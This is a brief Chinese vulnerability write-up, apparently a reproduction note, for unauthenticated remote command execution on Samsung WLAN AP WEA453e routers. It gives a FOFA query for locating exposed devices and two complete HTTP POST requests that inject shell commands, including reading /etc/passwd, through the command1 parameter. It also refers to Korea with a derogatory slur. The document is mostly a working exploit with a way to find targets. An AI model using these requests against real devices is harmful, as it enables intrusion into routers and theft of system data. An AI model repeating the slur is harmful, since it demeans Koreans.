一.漏洞背景

棒子 WLAN AP WEA453e路由器  存在漏洞（远程执行任意命令），可以在未经授权的情况下执行任意命令

漏洞复现

祭出fofa大法，fofa语法如下

title=="Samsung WLAN AP"

BurpSuite 构建请求如下

POST /(download)/tmp/a.txt HTTP/1.1Host:xxx.xxx.xxx.xxxConnection: closeContent-Length: 38
command1=shell: ls  | dd of=/tmp/a.txt

POST /(download)/tmp/a.txt HTTP/1.1Host:xxx.xxx.xxx.xxxConnection: closeContent-Length: 38
command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
